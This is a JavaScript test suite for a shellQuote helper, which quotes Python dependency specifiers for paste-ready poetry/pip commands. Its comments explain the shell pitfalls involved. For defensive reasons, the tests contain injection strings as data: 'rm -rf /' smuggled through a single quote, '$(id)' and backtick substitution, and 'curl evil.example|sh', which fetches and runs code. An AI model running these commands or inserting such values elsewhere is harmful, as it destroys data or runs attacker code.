import { shellQuote } from "@/utils/shell";

describe("shellQuote", () => {
  it("leaves an ordinary package name bare", () => {
    // The common case is a plain dependency list; quoting it would only add
    // noise to a command the operator reads before pasting.
    expect(shellQuote("requests")).toBe("requests");
    expect(shellQuote("vue-router")).toBe("vue-router");
    expect(shellQuote("ruamel.yaml")).toBe("ruamel.yaml");
    expect(shellQuote("typing_extensions")).toBe("typing_extensions");
  });

  it("quotes a version specifier so the shell cannot read it as redirection", () => {
    // Unquoted, the shell splits the word into an argument plus redirection
    // operands. In bash/sh `poetry add mcp>=1.2` runs `poetry add mcp` with
    // stdout redirected into a file named `=1.2` — so poetry SUCCEEDS and
    // installs mcp unpinned, ignoring the >=1.2 floor, with its output
    // swallowed into the stray file. The operator sees no sign of any of it.
    // (zsh fails differently and more loudly: `=1.2` hits EQUALS expansion
    // and errors before poetry runs at all.)
    expect(shellQuote("mcp>=1.2,<2")).toBe("'mcp>=1.2,<2'");
    expect(shellQuote("anthropic>=0.40")).toBe("'anthropic>=0.40'");
    expect(shellQuote("openai<1.50")).toBe("'openai<1.50'");
  });

  it("quotes the other requirement forms pip/poetry accept", () => {
    // Extras use `[]` — a glob, inert in bash unless a file happens to match,
    // but a hard error in zsh. Markers add `;` (command separator) and spaces
    // (word splitting), and `*` globs. Note `!` is NOT the hazard in
    // `urllib3!=2.0.*`: history expansion explicitly skips `!` followed by
    // `=`, so that case needs quoting for the `*` alone.
    expect(shellQuote("requests[socks]")).toBe("'requests[socks]'");
    expect(shellQuote('httpx; python_version < "3.11"')).toBe(
      "'httpx; python_version < \"3.11\"'",
    );
    expect(shellQuote("urllib3!=2.0.*")).toBe("'urllib3!=2.0.*'");
    expect(shellQuote("mypkg @ git+https://example.com/p.git")).toBe(
      "'mypkg @ git+https://example.com/p.git'",
    );
  });

  it("escapes an embedded single quote instead of ending the quoted run", () => {
    // python_deps is server-reported plugin metadata, so it can contain
    // anything. A naive `'${dep}'` would let a lone quote close the string and
    // hand the rest of the value to the shell as code.
    expect(shellQuote("evil'; rm -rf /; echo '")).toBe(
      "'evil'\\''; rm -rf /; echo '\\'''",
    );
  });

  it("quotes an empty string so it stays a visible argument", () => {
    // Bare emptiness would silently disappear from the joined command.
    expect(shellQuote("")).toBe("''");
  });

  it("quotes metacharacters that never appear in a real requirement", () => {
    // The cases above all sample from one distribution: characters found in
    // legitimate PEP 508 requirements. The allowlist exists for the
    // complement of that set, so pin it directly — swapping the allowlist for
    // a blocklist of "the characters specifiers use" is a plausible
    // readability-motivated change, and one that omitted these would turn a
    // broken paste into command execution on paste.
    expect(shellQuote("foo$(id)")).toBe("'foo$(id)'");
    expect(shellQuote("foo`id`")).toBe("'foo`id`'");
    expect(shellQuote("foo;curl evil.example|sh")).toBe(
      "'foo;curl evil.example|sh'",
    );
  });

  it("stringifies a non-string entry rather than throwing mid-render", () => {
    // python_deps is whatever the server sent; the coercion rationale lives in
    // shell.js. A visibly wrong command beats a throw, which would take the
    // whole dependency warning down with it.
    expect(shellQuote({ name: "requests" })).toBe("'[object Object]'");
    expect(shellQuote(["a b"])).toBe("'a b'");
    expect(shellQuote(42)).toBe("42");
  });

  it("renders null/undefined as an empty argument instead of dropping it", () => {
    // Returned bare, these stringify to "" inside join(" ") and the dependency
    // silently vanishes from the command — no error, no visual cue beyond a
    // double space, and poetry then succeeds while the plugin still fails to
    // load.
    expect(shellQuote(null)).toBe("''");
    expect(shellQuote(undefined)).toBe("''");
  });
});
